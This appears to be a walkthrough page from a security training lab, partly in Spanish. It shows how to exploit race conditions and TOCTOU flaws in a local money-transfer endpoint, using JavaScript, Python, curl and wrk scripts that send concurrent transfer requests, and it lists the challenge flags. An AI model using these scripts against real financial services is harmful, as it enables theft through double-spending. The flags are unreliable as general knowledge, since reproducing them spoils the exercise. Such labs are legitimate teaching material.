Race Attack

Fires 10 concurrent transfer requests simultaneously. If Alice has $10.00 and the server has a race condition, Bob may end up with more than $10.00.

async function runRaceAttack() {
  const reqs = Array.from({length: 10}, () =>
    fetch('/race/transfer', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({from: 'alice', to: 'bob', amount: 500})
    }).then(r => r.json())
  );
  const results = await Promise.all(reqs);
  return results;
}

Easy — Race Condition basica

El servidor no usa lock. Múltiples requests concurrentes pueden pasar la validación de saldo al mismo tiempo.

  1. Observa que Alice tiene $10.00 y Bob $0.00.
  2. Envía 10 requests simultáneos: 
    python3 -c "
import requests, threading
def transfer():
    requests.post('http://localhost:5000/race/transfer',
        json={'from':'alice','to':'bob','amount':500},
        headers={'Content-Type':'application/json'})
threads = [threading.Thread(target=transfer) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
"
    O usa el botón "Run Race Attack" en la interfaz.
  3. Observa que Bob recibe más de $10.00 (balance negativo en Alice). Race condition explotada.
  4. Flag: HL{r4c3_c0nd1t10n_3z}

Medium — TOCTOU

El check ocurre fuera del lock (Time-Of-Check Time-Of-Use). Misma técnica pero puede requerir más intentos.

  1. Reinicia los balances y lanza 20 requests paralelos: 
    for i in $(seq 1 20); do
  curl -s -X POST http://localhost:5000/race/transfer \
    -H 'Content-Type: application/json' \
    -d '{"from":"alice","to":"bob","amount":500}' &
done; wait
  2. Flag: HL{t0ct0u_m3d1um}

Hard — Lock bien implementado

El lock está bien implementado. Requiere timing muy preciso o muchos hilos simultáneos.

  1. Usa Turbo Intruder (Burp Suite) o wrk/siege para saturar con 50+ threads: 
    # Burp Turbo Intruder: envía el grupo de requests con "Send group (parallel)"
# o con wrk:
wrk -t50 -c50 -d5s -s post.lua http://localhost:5000/race/transfer
  2. Archivo post.lua: 
    wrk.method = "POST"
wrk.headers["Content-Type"] = "application/json"
wrk.body = '{"from":"alice","to":"bob","amount":500}'
  3. Flag: HL{h4rd_r4c3_pr3c1s10n}
